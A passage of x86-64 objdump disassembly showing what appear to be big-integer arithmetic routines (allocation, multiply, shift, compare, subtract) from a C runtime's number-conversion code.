   32c4873b9:	45 89 54 81 18       	mov    %r10d,0x18(%r9,%rax,4)
   32c4873be:	45 89 59 14          	mov    %r11d,0x14(%r9)
   32c4873c2:	48 89 d8             	mov    %rbx,%rax
   32c4873c5:	48 83 c4 30          	add    $0x30,%rsp
   32c4873c9:	5b                   	pop    %rbx
   32c4873ca:	c3                   	ret
   32c4873cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4873d0:	41 8b 41 08          	mov    0x8(%r9),%eax
   32c4873d4:	44 89 5c 24 2c       	mov    %r11d,0x2c(%rsp)
   32c4873d9:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   32c4873de:	8d 48 01             	lea    0x1(%rax),%ecx
   32c4873e1:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   32c4873e6:	e8 d5 fd ff ff       	call   0x32c4871c0
   32c4873eb:	48 89 c3             	mov    %rax,%rbx
   32c4873ee:	48 85 c0             	test   %rax,%rax
   32c4873f1:	74 cf                	je     0x32c4873c2
   32c4873f3:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   32c4873f8:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   32c4873fc:	49 63 41 14          	movslq 0x14(%r9),%rax
   32c487400:	49 8d 51 10          	lea    0x10(%r9),%rdx
   32c487404:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   32c48740b:	00 
   32c48740c:	e8 8f 10 00 00       	call   0x32c4884a0
   32c487411:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   32c487416:	e8 b5 fe ff ff       	call   0x32c4872d0
   32c48741b:	44 8b 5c 24 2c       	mov    0x2c(%rsp),%r11d
   32c487420:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   32c487425:	49 89 d9             	mov    %rbx,%r9
   32c487428:	eb 85                	jmp    0x32c4873af
   32c48742a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487430:	53                   	push   %rbx
   32c487431:	48 83 ec 30          	sub    $0x30,%rsp
   32c487435:	89 cb                	mov    %ecx,%ebx
   32c487437:	31 c9                	xor    %ecx,%ecx
   32c487439:	e8 42 fc ff ff       	call   0x32c487080
   32c48743e:	48 8b 05 03 86 00 00 	mov    0x8603(%rip),%rax        # 0x32c48fa48
   32c487445:	48 85 c0             	test   %rax,%rax
   32c487448:	74 2e                	je     0x32c487478
   32c48744a:	48 8b 10             	mov    (%rax),%rdx
   32c48744d:	83 3d 3c 86 00 00 02 	cmpl   $0x2,0x863c(%rip)        # 0x32c48fa90
   32c487454:	48 89 15 ed 85 00 00 	mov    %rdx,0x85ed(%rip)        # 0x32c48fa48
   32c48745b:	74 63                	je     0x32c4874c0
   32c48745d:	48 8b 15 2c 4f 00 00 	mov    0x4f2c(%rip),%rdx        # 0x32c48c390
   32c487464:	89 58 18             	mov    %ebx,0x18(%rax)
   32c487467:	48 89 50 10          	mov    %rdx,0x10(%rax)
   32c48746b:	48 83 c4 30          	add    $0x30,%rsp
   32c48746f:	5b                   	pop    %rbx
   32c487470:	c3                   	ret
   32c487471:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c487478:	48 8b 05 11 1c 00 00 	mov    0x1c11(%rip),%rax        # 0x32c489090
   32c48747f:	48 8d 0d ba 7c 00 00 	lea    0x7cba(%rip),%rcx        # 0x32c48f140
   32c487486:	48 89 c2             	mov    %rax,%rdx
   32c487489:	48 29 ca             	sub    %rcx,%rdx
   32c48748c:	48 c1 fa 03          	sar    $0x3,%rdx
   32c487490:	48 83 c2 05          	add    $0x5,%rdx
   32c487494:	48 81 fa 20 01 00 00 	cmp    $0x120,%rdx
   32c48749b:	76 43                	jbe    0x32c4874e0
   32c48749d:	b9 28 00 00 00       	mov    $0x28,%ecx
   32c4874a2:	e8 f1 0f 00 00       	call   0x32c488498
   32c4874a7:	48 85 c0             	test   %rax,%rax
   32c4874aa:	74 bf                	je     0x32c48746b
   32c4874ac:	48 8b 15 d5 4e 00 00 	mov    0x4ed5(%rip),%rdx        # 0x32c48c388
   32c4874b3:	83 3d d6 85 00 00 02 	cmpl   $0x2,0x85d6(%rip)        # 0x32c48fa90
   32c4874ba:	48 89 50 08          	mov    %rdx,0x8(%rax)
   32c4874be:	75 9d                	jne    0x32c48745d
   32c4874c0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4874c5:	48 8d 0d d4 85 00 00 	lea    0x85d4(%rip),%rcx        # 0x32c48faa0
   32c4874cc:	ff 15 0e 9d 00 00    	call   *0x9d0e(%rip)        # 0x32c4911e0
   32c4874d2:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c4874d7:	eb 84                	jmp    0x32c48745d
   32c4874d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4874e0:	48 8d 50 28          	lea    0x28(%rax),%rdx
   32c4874e4:	48 89 15 a5 1b 00 00 	mov    %rdx,0x1ba5(%rip)        # 0x32c489090
   32c4874eb:	eb bf                	jmp    0x32c4874ac
   32c4874ed:	0f 1f 00             	nopl   (%rax)
   32c4874f0:	41 57                	push   %r15
   32c4874f2:	41 56                	push   %r14
   32c4874f4:	41 55                	push   %r13
   32c4874f6:	41 54                	push   %r12
   32c4874f8:	55                   	push   %rbp
   32c4874f9:	57                   	push   %rdi
   32c4874fa:	56                   	push   %rsi
   32c4874fb:	53                   	push   %rbx
   32c4874fc:	48 83 ec 38          	sub    $0x38,%rsp
   32c487500:	48 63 79 14          	movslq 0x14(%rcx),%rdi
   32c487504:	4c 63 6a 14          	movslq 0x14(%rdx),%r13
   32c487508:	48 89 cd             	mov    %rcx,%rbp
   32c48750b:	49 89 d6             	mov    %rdx,%r14
   32c48750e:	44 39 ef             	cmp    %r13d,%edi
   32c487511:	7c 0f                	jl     0x32c487522
   32c487513:	44 89 e8             	mov    %r13d,%eax
   32c487516:	49 89 ce             	mov    %rcx,%r14
   32c487519:	4c 63 ef             	movslq %edi,%r13
   32c48751c:	48 89 d5             	mov    %rdx,%rbp
   32c48751f:	48 63 f8             	movslq %eax,%rdi
   32c487522:	31 c9                	xor    %ecx,%ecx
   32c487524:	41 8d 5c 3d 00       	lea    0x0(%r13,%rdi,1),%ebx
   32c487529:	41 39 5e 0c          	cmp    %ebx,0xc(%r14)
   32c48752d:	0f 9c c1             	setl   %cl
   32c487530:	41 03 4e 08          	add    0x8(%r14),%ecx
   32c487534:	e8 87 fc ff ff       	call   0x32c4871c0
   32c487539:	48 89 c1             	mov    %rax,%rcx
   32c48753c:	48 85 c0             	test   %rax,%rax
   32c48753f:	0f 84 5e 01 00 00    	je     0x32c4876a3
   32c487545:	48 8d 70 18          	lea    0x18(%rax),%rsi
   32c487549:	48 63 c3             	movslq %ebx,%rax
   32c48754c:	48 8d 14 86          	lea    (%rsi,%rax,4),%rdx
   32c487550:	48 39 d6             	cmp    %rdx,%rsi
   32c487553:	73 61                	jae    0x32c4875b6
   32c487555:	48 89 f0             	mov    %rsi,%rax
   32c487558:	c7 06 00 00 00 00    	movl   $0x0,(%rsi)
   32c48755e:	48 f7 d0             	not    %rax
   32c487561:	48 01 d0             	add    %rdx,%rax
   32c487564:	48 c1 e8 02          	shr    $0x2,%rax
   32c487568:	49 89 c0             	mov    %rax,%r8
   32c48756b:	48 8d 41 1c          	lea    0x1c(%rcx),%rax
   32c48756f:	48 39 d0             	cmp    %rdx,%rax
   32c487572:	73 42                	jae    0x32c4875b6
   32c487574:	41 83 e0 01          	and    $0x1,%r8d
   32c487578:	74 26                	je     0x32c4875a0
   32c48757a:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   32c487580:	48 8d 41 20          	lea    0x20(%rcx),%rax
   32c487584:	48 39 d0             	cmp    %rdx,%rax
   32c487587:	73 2d                	jae    0x32c4875b6
   32c487589:	90                   	nop
   32c48758a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487591:	00 00 00 00 
   32c487595:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48759c:	00 00 00 00 
   32c4875a0:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   32c4875a6:	48 83 c0 08          	add    $0x8,%rax
   32c4875aa:	c7 40 fc 00 00 00 00 	movl   $0x0,-0x4(%rax)
   32c4875b1:	48 39 d0             	cmp    %rdx,%rax
   32c4875b4:	72 ea                	jb     0x32c4875a0
   32c4875b6:	4c 8d 4d 18          	lea    0x18(%rbp),%r9
   32c4875ba:	49 8d 2c b9          	lea    (%r9,%rdi,4),%rbp
   32c4875be:	49 39 e9             	cmp    %rbp,%r9
   32c4875c1:	0f 83 c3 00 00 00    	jae    0x32c48768a
   32c4875c7:	4d 8d 66 18          	lea    0x18(%r14),%r12
   32c4875cb:	49 8d 46 19          	lea    0x19(%r14),%rax
   32c4875cf:	89 5c 24 2c          	mov    %ebx,0x2c(%rsp)
   32c4875d3:	48 89 d3             	mov    %rdx,%rbx
   32c4875d6:	4b 8d 3c ac          	lea    (%r12,%r13,4),%rdi
   32c4875da:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   32c4875df:	48 39 c7             	cmp    %rax,%rdi
   32c4875e2:	48 89 f8             	mov    %rdi,%rax
   32c4875e5:	41 0f 93 c5          	setae  %r13b
   32c4875e9:	4c 29 f0             	sub    %r14,%rax
   32c4875ec:	45 31 ff             	xor    %r15d,%r15d
   32c4875ef:	48 83 e8 19          	sub    $0x19,%rax
   32c4875f3:	48 c1 e8 02          	shr    $0x2,%rax
   32c4875f7:	49 89 c6             	mov    %rax,%r14
   32c4875fa:	eb 0d                	jmp    0x32c487609
   32c4875fc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c487600:	48 83 c6 04          	add    $0x4,%rsi
   32c487604:	49 39 e9             	cmp    %rbp,%r9
   32c487607:	73 7a                	jae    0x32c487683
   32c487609:	45 8b 19             	mov    (%r9),%r11d
   32c48760c:	49 83 c1 04          	add    $0x4,%r9
   32c487610:	45 85 db             	test   %r11d,%r11d
   32c487613:	74 eb                	je     0x32c487600
   32c487615:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   32c48761a:	49 89 f0             	mov    %rsi,%r8
   32c48761d:	45 31 d2             	xor    %r10d,%r10d
   32c487620:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c487627:	00 00 00 
   32c48762a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487631:	00 00 00 00 
   32c487635:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48763c:	00 00 00 00 
   32c487640:	8b 02                	mov    (%rdx),%eax
   32c487642:	45 8b 20             	mov    (%r8),%r12d
   32c487645:	48 83 c2 04          	add    $0x4,%rdx
   32c487649:	49 83 c0 04          	add    $0x4,%r8
   32c48764d:	49 0f af c3          	imul   %r11,%rax
   32c487651:	4c 01 e0             	add    %r12,%rax
   32c487654:	4c 01 d0             	add    %r10,%rax
   32c487657:	49 89 c2             	mov    %rax,%r10
   32c48765a:	41 89 40 fc          	mov    %eax,-0x4(%r8)
   32c48765e:	49 c1 ea 20          	shr    $0x20,%r10
   32c487662:	48 39 fa             	cmp    %rdi,%rdx
   32c487665:	72 d9                	jb     0x32c487640
   32c487667:	45 84 ed             	test   %r13b,%r13b
   32c48766a:	4a 8d 04 b5 00 00 00 	lea    0x0(,%r14,4),%rax
   32c487671:	00 
   32c487672:	49 0f 44 c7          	cmove  %r15,%rax
   32c487676:	48 83 c6 04          	add    $0x4,%rsi
   32c48767a:	44 89 14 06          	mov    %r10d,(%rsi,%rax,1)
   32c48767e:	49 39 e9             	cmp    %rbp,%r9
   32c487681:	72 86                	jb     0x32c487609
   32c487683:	48 89 da             	mov    %rbx,%rdx
   32c487686:	8b 5c 24 2c          	mov    0x2c(%rsp),%ebx
   32c48768a:	85 db                	test   %ebx,%ebx
   32c48768c:	7f 07                	jg     0x32c487695
   32c48768e:	eb 10                	jmp    0x32c4876a0
   32c487690:	83 eb 01             	sub    $0x1,%ebx
   32c487693:	74 0b                	je     0x32c4876a0
   32c487695:	8b 42 fc             	mov    -0x4(%rdx),%eax
   32c487698:	48 83 ea 04          	sub    $0x4,%rdx
   32c48769c:	85 c0                	test   %eax,%eax
   32c48769e:	74 f0                	je     0x32c487690
   32c4876a0:	89 59 14             	mov    %ebx,0x14(%rcx)
   32c4876a3:	48 89 c8             	mov    %rcx,%rax
   32c4876a6:	48 83 c4 38          	add    $0x38,%rsp
   32c4876aa:	5b                   	pop    %rbx
   32c4876ab:	5e                   	pop    %rsi
   32c4876ac:	5f                   	pop    %rdi
   32c4876ad:	5d                   	pop    %rbp
   32c4876ae:	41 5c                	pop    %r12
   32c4876b0:	41 5d                	pop    %r13
   32c4876b2:	41 5e                	pop    %r14
   32c4876b4:	41 5f                	pop    %r15
   32c4876b6:	c3                   	ret
   32c4876b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4876be:	00 00 
   32c4876c0:	55                   	push   %rbp
   32c4876c1:	57                   	push   %rdi
   32c4876c2:	56                   	push   %rsi
   32c4876c3:	53                   	push   %rbx
   32c4876c4:	48 83 ec 28          	sub    $0x28,%rsp
   32c4876c8:	89 d0                	mov    %edx,%eax
   32c4876ca:	48 89 cf             	mov    %rcx,%rdi
   32c4876cd:	89 d3                	mov    %edx,%ebx
   32c4876cf:	83 e0 03             	and    $0x3,%eax
   32c4876d2:	0f 85 98 00 00 00    	jne    0x32c487770
   32c4876d8:	c1 fb 02             	sar    $0x2,%ebx
   32c4876db:	48 89 fd             	mov    %rdi,%rbp
   32c4876de:	0f 84 be 00 00 00    	je     0x32c4877a2
   32c4876e4:	48 8b 35 35 7a 00 00 	mov    0x7a35(%rip),%rsi        # 0x32c48f120
   32c4876eb:	48 85 f6             	test   %rsi,%rsi
   32c4876ee:	75 1d                	jne    0x32c48770d
   32c4876f0:	e9 dd 00 00 00       	jmp    0x32c4877d2
   32c4876f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4876fc:	00 00 00 00 
   32c487700:	48 8b 2e             	mov    (%rsi),%rbp
   32c487703:	d1 fb                	sar    $1,%ebx
   32c487705:	48 85 ed             	test   %rbp,%rbp
   32c487708:	74 32                	je     0x32c48773c
   32c48770a:	48 89 ee             	mov    %rbp,%rsi
   32c48770d:	f6 c3 01             	test   $0x1,%bl
   32c487710:	74 ee                	je     0x32c487700
   32c487712:	48 89 f2             	mov    %rsi,%rdx
   32c487715:	48 89 f9             	mov    %rdi,%rcx
   32c487718:	e8 d3 fd ff ff       	call   0x32c4874f0
   32c48771d:	48 89 c5             	mov    %rax,%rbp
   32c487720:	48 85 c0             	test   %rax,%rax
   32c487723:	74 7b                	je     0x32c4877a0
   32c487725:	48 89 f9             	mov    %rdi,%rcx
   32c487728:	e8 a3 fb ff ff       	call   0x32c4872d0
   32c48772d:	d1 fb                	sar    $1,%ebx
   32c48772f:	74 71                	je     0x32c4877a2
   32c487731:	48 89 ef             	mov    %rbp,%rdi
   32c487734:	48 8b 2e             	mov    (%rsi),%rbp
   32c487737:	48 85 ed             	test   %rbp,%rbp
   32c48773a:	75 ce                	jne    0x32c48770a
   32c48773c:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c487741:	e8 3a f9 ff ff       	call   0x32c487080
   32c487746:	48 8b 2e             	mov    (%rsi),%rbp
   32c487749:	48 85 ed             	test   %rbp,%rbp
   32c48774c:	74 62                	je     0x32c4877b0
   32c48774e:	83 3d 3b 83 00 00 02 	cmpl   $0x2,0x833b(%rip)        # 0x32c48fa90
   32c487755:	75 b3                	jne    0x32c48770a
   32c487757:	48 8d 0d 6a 83 00 00 	lea    0x836a(%rip),%rcx        # 0x32c48fac8
   32c48775e:	ff 15 7c 9a 00 00    	call   *0x9a7c(%rip)        # 0x32c4911e0
   32c487764:	eb a4                	jmp    0x32c48770a
   32c487766:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48776d:	00 00 00 
   32c487770:	83 e8 01             	sub    $0x1,%eax
   32c487773:	48 8d 15 c6 4a 00 00 	lea    0x4ac6(%rip),%rdx        # 0x32c48c240
   32c48777a:	45 31 c0             	xor    %r8d,%r8d
   32c48777d:	48 98                	cltq
   32c48777f:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   32c487782:	e8 b9 fb ff ff       	call   0x32c487340
   32c487787:	48 89 c7             	mov    %rax,%rdi
   32c48778a:	48 85 c0             	test   %rax,%rax
   32c48778d:	0f 85 45 ff ff ff    	jne    0x32c4876d8
   32c487793:	66 90                	xchg   %ax,%ax
   32c487795:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48779c:	00 00 00 00 
   32c4877a0:	31 ed                	xor    %ebp,%ebp
   32c4877a2:	48 89 e8             	mov    %rbp,%rax
   32c4877a5:	48 83 c4 28          	add    $0x28,%rsp
   32c4877a9:	5b                   	pop    %rbx
   32c4877aa:	5e                   	pop    %rsi
   32c4877ab:	5f                   	pop    %rdi
   32c4877ac:	5d                   	pop    %rbp
   32c4877ad:	c3                   	ret
   32c4877ae:	66 90                	xchg   %ax,%ax
   32c4877b0:	48 89 f2             	mov    %rsi,%rdx
   32c4877b3:	48 89 f1             	mov    %rsi,%rcx
   32c4877b6:	e8 35 fd ff ff       	call   0x32c4874f0
   32c4877bb:	48 89 06             	mov    %rax,(%rsi)
   32c4877be:	48 89 c5             	mov    %rax,%rbp
   32c4877c1:	48 85 c0             	test   %rax,%rax
   32c4877c4:	74 da                	je     0x32c4877a0
   32c4877c6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   32c4877cd:	e9 7c ff ff ff       	jmp    0x32c48774e
   32c4877d2:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c4877d7:	e8 a4 f8 ff ff       	call   0x32c487080
   32c4877dc:	48 8b 35 3d 79 00 00 	mov    0x793d(%rip),%rsi        # 0x32c48f120
   32c4877e3:	48 85 f6             	test   %rsi,%rsi
   32c4877e6:	74 1f                	je     0x32c487807
   32c4877e8:	83 3d a1 82 00 00 02 	cmpl   $0x2,0x82a1(%rip)        # 0x32c48fa90
   32c4877ef:	0f 85 18 ff ff ff    	jne    0x32c48770d
   32c4877f5:	48 8d 0d cc 82 00 00 	lea    0x82cc(%rip),%rcx        # 0x32c48fac8
   32c4877fc:	ff 15 de 99 00 00    	call   *0x99de(%rip)        # 0x32c4911e0
   32c487802:	e9 06 ff ff ff       	jmp    0x32c48770d
   32c487807:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c48780c:	e8 af f9 ff ff       	call   0x32c4871c0
   32c487811:	48 89 c6             	mov    %rax,%rsi
   32c487814:	48 85 c0             	test   %rax,%rax
   32c487817:	74 1e                	je     0x32c487837
   32c487819:	48 b8 01 00 00 00 71 	movabs $0x27100000001,%rax
   32c487820:	02 00 00 
   32c487823:	48 89 35 f6 78 00 00 	mov    %rsi,0x78f6(%rip)        # 0x32c48f120
   32c48782a:	48 89 46 14          	mov    %rax,0x14(%rsi)
   32c48782e:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
   32c487835:	eb b1                	jmp    0x32c4877e8
   32c487837:	48 c7 05 de 78 00 00 	movq   $0x0,0x78de(%rip)        # 0x32c48f120
   32c48783e:	00 00 00 00 
   32c487842:	31 ed                	xor    %ebp,%ebp
   32c487844:	e9 59 ff ff ff       	jmp    0x32c4877a2
   32c487849:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c487850:	41 56                	push   %r14
   32c487852:	41 55                	push   %r13
   32c487854:	41 54                	push   %r12
   32c487856:	55                   	push   %rbp
   32c487857:	57                   	push   %rdi
   32c487858:	56                   	push   %rsi
   32c487859:	53                   	push   %rbx
   32c48785a:	48 83 ec 20          	sub    $0x20,%rsp
   32c48785e:	48 89 cb             	mov    %rcx,%rbx
   32c487861:	89 d6                	mov    %edx,%esi
   32c487863:	8b 49 08             	mov    0x8(%rcx),%ecx
   32c487866:	41 89 d6             	mov    %edx,%r14d
   32c487869:	8b 6b 14             	mov    0x14(%rbx),%ebp
   32c48786c:	c1 fe 05             	sar    $0x5,%esi
   32c48786f:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c487872:	01 f5                	add    %esi,%ebp
   32c487874:	44 8d 65 01          	lea    0x1(%rbp),%r12d
   32c487878:	41 39 c4             	cmp    %eax,%r12d
   32c48787b:	7e 0d                	jle    0x32c48788a
   32c48787d:	0f 1f 00             	nopl   (%rax)
   32c487880:	01 c0                	add    %eax,%eax
   32c487882:	83 c1 01             	add    $0x1,%ecx
   32c487885:	41 39 c4             	cmp    %eax,%r12d
   32c487888:	7f f6                	jg     0x32c487880
   32c48788a:	e8 31 f9 ff ff       	call   0x32c4871c0
   32c48788f:	49 89 c5             	mov    %rax,%r13
   32c487892:	48 85 c0             	test   %rax,%rax
   32c487895:	0f 84 fb 00 00 00    	je     0x32c487996
   32c48789b:	48 8d 78 18          	lea    0x18(%rax),%rdi
   32c48789f:	85 f6                	test   %esi,%esi
   32c4878a1:	7e 59                	jle    0x32c4878fc
   32c4878a3:	8d 46 06             	lea    0x6(%rsi),%eax
   32c4878a6:	48 98                	cltq
   32c4878a8:	49 8d 54 85 00       	lea    0x0(%r13,%rax,4),%rdx
   32c4878ad:	48 89 f8             	mov    %rdi,%rax
   32c4878b0:	48 89 d1             	mov    %rdx,%rcx
   32c4878b3:	48 29 f9             	sub    %rdi,%rcx
   32c4878b6:	83 e1 04             	and    $0x4,%ecx
   32c4878b9:	74 25                	je     0x32c4878e0
   32c4878bb:	49 8d 45 1c          	lea    0x1c(%r13),%rax
   32c4878bf:	c7 40 fc 00 00 00 00 	movl   $0x0,-0x4(%rax)
   32c4878c6:	48 39 d0             	cmp    %rdx,%rax
   32c4878c9:	74 2b                	je     0x32c4878f6
   32c4878cb:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4878d2:	00 00 00 
   32c4878d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4878dc:	00 00 00 00 
   32c4878e0:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   32c4878e6:	48 83 c0 08          	add    $0x8,%rax
   32c4878ea:	c7 40 fc 00 00 00 00 	movl   $0x0,-0x4(%rax)
   32c4878f1:	48 39 d0             	cmp    %rdx,%rax
   32c4878f4:	75 ea                	jne    0x32c4878e0
   32c4878f6:	89 f6                	mov    %esi,%esi
   32c4878f8:	48 8d 3c b7          	lea    (%rdi,%rsi,4),%rdi
   32c4878fc:	48 63 43 14          	movslq 0x14(%rbx),%rax
   32c487900:	48 8d 73 18          	lea    0x18(%rbx),%rsi
   32c487904:	4c 8d 0c 86          	lea    (%rsi,%rax,4),%r9
   32c487908:	41 83 e6 1f          	and    $0x1f,%r14d
   32c48790c:	0f 84 9e 00 00 00    	je     0x32c4879b0
   32c487912:	41 ba 20 00 00 00    	mov    $0x20,%r10d
   32c487918:	49 89 f8             	mov    %rdi,%r8
   32c48791b:	31 d2                	xor    %edx,%edx
   32c48791d:	45 29 f2             	sub    %r14d,%r10d
   32c487920:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c487927:	00 00 00 
   32c48792a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487931:	00 00 00 00 
   32c487935:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48793c:	00 00 00 00 
   32c487940:	8b 06                	mov    (%rsi),%eax
   32c487942:	44 89 f1             	mov    %r14d,%ecx
   32c487945:	49 83 c0 04          	add    $0x4,%r8
   32c487949:	48 83 c6 04          	add    $0x4,%rsi
   32c48794d:	d3 e0                	shl    %cl,%eax
   32c48794f:	44 89 d1             	mov    %r10d,%ecx
   32c487952:	09 d0                	or     %edx,%eax
   32c487954:	41 89 40 fc          	mov    %eax,-0x4(%r8)
   32c487958:	8b 56 fc             	mov    -0x4(%rsi),%edx
   32c48795b:	d3 ea                	shr    %cl,%edx
   32c48795d:	4c 39 ce             	cmp    %r9,%rsi
   32c487960:	72 de                	jb     0x32c487940
   32c487962:	4c 89 c8             	mov    %r9,%rax
   32c487965:	48 8d 4b 19          	lea    0x19(%rbx),%rcx
   32c487969:	48 29 d8             	sub    %rbx,%rax
   32c48796c:	48 83 e8 19          	sub    $0x19,%rax
   32c487970:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   32c487974:	49 39 c9             	cmp    %rcx,%r9
   32c487977:	b9 00 00 00 00       	mov    $0x0,%ecx
   32c48797c:	48 0f 42 c1          	cmovb  %rcx,%rax
   32c487980:	85 d2                	test   %edx,%edx
   32c487982:	41 0f 45 ec          	cmovne %r12d,%ebp
   32c487986:	89 54 07 04          	mov    %edx,0x4(%rdi,%rax,1)
   32c48798a:	41 89 6d 14          	mov    %ebp,0x14(%r13)
   32c48798e:	48 89 d9             	mov    %rbx,%rcx
   32c487991:	e8 3a f9 ff ff       	call   0x32c4872d0
   32c487996:	4c 89 e8             	mov    %r13,%rax
   32c487999:	48 83 c4 20          	add    $0x20,%rsp
   32c48799d:	5b                   	pop    %rbx
   32c48799e:	5e                   	pop    %rsi
   32c48799f:	5f                   	pop    %rdi
   32c4879a0:	5d                   	pop    %rbp
   32c4879a1:	41 5c                	pop    %r12
   32c4879a3:	41 5d                	pop    %r13
   32c4879a5:	41 5e                	pop    %r14
   32c4879a7:	c3                   	ret
   32c4879a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4879af:	00 
   32c4879b0:	a5                   	movsl  (%rsi),(%rdi)
   32c4879b1:	4c 39 ce             	cmp    %r9,%rsi
   32c4879b4:	73 d4                	jae    0x32c48798a
   32c4879b6:	a5                   	movsl  (%rsi),(%rdi)
   32c4879b7:	4c 39 ce             	cmp    %r9,%rsi
   32c4879ba:	72 f4                	jb     0x32c4879b0
   32c4879bc:	eb cc                	jmp    0x32c48798a
   32c4879be:	66 90                	xchg   %ax,%ax
   32c4879c0:	48 63 42 14          	movslq 0x14(%rdx),%rax
   32c4879c4:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   32c4879c8:	49 89 d1             	mov    %rdx,%r9
   32c4879cb:	41 29 c0             	sub    %eax,%r8d
   32c4879ce:	75 4c                	jne    0x32c487a1c
   32c4879d0:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   32c4879d7:	00 
   32c4879d8:	48 83 c1 18          	add    $0x18,%rcx
   32c4879dc:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   32c4879e0:	49 8d 54 11 18       	lea    0x18(%r9,%rdx,1),%rdx
   32c4879e5:	eb 1e                	jmp    0x32c487a05
   32c4879e7:	0f 1f 00             	nopl   (%rax)
   32c4879ea:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4879f1:	00 00 00 00 
   32c4879f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4879fc:	00 00 00 00 
   32c487a00:	48 39 c1             	cmp    %rax,%rcx
   32c487a03:	73 17                	jae    0x32c487a1c
   32c487a05:	48 83 e8 04          	sub    $0x4,%rax
   32c487a09:	48 83 ea 04          	sub    $0x4,%rdx
   32c487a0d:	44 8b 12             	mov    (%rdx),%r10d
   32c487a10:	44 39 10             	cmp    %r10d,(%rax)
   32c487a13:	74 eb                	je     0x32c487a00
   32c487a15:	45 19 c0             	sbb    %r8d,%r8d
   32c487a18:	41 83 c8 01          	or     $0x1,%r8d
   32c487a1c:	44 89 c0             	mov    %r8d,%eax
   32c487a1f:	c3                   	ret
   32c487a20:	41 55                	push   %r13
   32c487a22:	41 54                	push   %r12
   32c487a24:	55                   	push   %rbp
   32c487a25:	57                   	push   %rdi
   32c487a26:	56                   	push   %rsi
   32c487a27:	53                   	push   %rbx
   32c487a28:	48 83 ec 28          	sub    $0x28,%rsp
   32c487a2c:	48 63 42 14          	movslq 0x14(%rdx),%rax
   32c487a30:	8b 79 14             	mov    0x14(%rcx),%edi
   32c487a33:	48 89 ce             	mov    %rcx,%rsi
   32c487a36:	48 89 d3             	mov    %rdx,%rbx
   32c487a39:	29 c7                	sub    %eax,%edi
   32c487a3b:	75 53                	jne    0x32c487a90
   32c487a3d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   32c487a44:	00 
   32c487a45:	48 8d 49 18          	lea    0x18(%rcx),%rcx
   32c487a49:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   32c487a4d:	48 8d 54 13 18       	lea    0x18(%rbx,%rdx,1),%rdx
   32c487a52:	eb 15                	jmp    0x32c487a69
   32c487a54:	90                   	nop
   32c487a55:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487a5c:	00 00 00 00 
   32c487a60:	48 39 c1             	cmp    %rax,%rcx
   32c487a63:	0f 83 7f 01 00 00    	jae    0x32c487be8
   32c487a69:	48 83 e8 04          	sub    $0x4,%rax
   32c487a6d:	48 83 ea 04          	sub    $0x4,%rdx
   32c487a71:	44 8b 12             	mov    (%rdx),%r10d
   32c487a74:	44 39 10             	cmp    %r10d,(%rax)
   32c487a77:	74 e7                	je     0x32c487a60
   32c487a79:	0f 83 91 01 00 00    	jae    0x32c487c10
   32c487a7f:	bf 01 00 00 00       	mov    $0x1,%edi
   32c487a84:	eb 1f                	jmp    0x32c487aa5
   32c487a86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c487a8d:	00 00 00 
